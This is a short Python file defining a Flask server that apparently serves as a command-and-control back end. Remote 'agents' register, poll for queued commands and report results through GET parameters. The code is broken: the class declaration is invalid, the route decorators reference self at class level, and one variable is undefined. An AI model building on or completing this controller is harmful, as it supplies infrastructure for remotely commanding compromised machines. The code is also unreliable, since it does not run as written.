from flask import Flask, jsonify, request
from libs.encryption import *

class Server(object,key):
        def __init__(self):
                self.agents = []
                self.commands = []
                self.app = Flask(__name__)
        @self.app.route("/new",methods=['GET'])
        def app_new(self):
                agent_name = request.args['agent']
                if not agent_name in self.agents:
                        self.agents.append(self_name)
                return "ok", 200
        @self.app.route("/cmd",methods=['GET'])
        def app_cmd(self):
                agent_name = request.args['agent']
                for entry in self.commands:
                        if entry['agent'] == agent_name:
                                cmd = entry['cmd']
                                uid = entry['uid']
                                return jsonify({
                                        'cmd':cmd,
                                        'id':uid,
                                        }), 200
                return "none", 200
        @self.app.route("/res",methods=['GET'])
        def app_res(self):
                uid = request.args['id']
                result = request.args['result']
                for entry in self.commands:
                        if entry['uid'] == uid:
                                entry['res'] = result
                return "ok", 200
        def serve(self,ip="0.0.0.0",port=1029):
                self.app.run(host=ip,port=port)
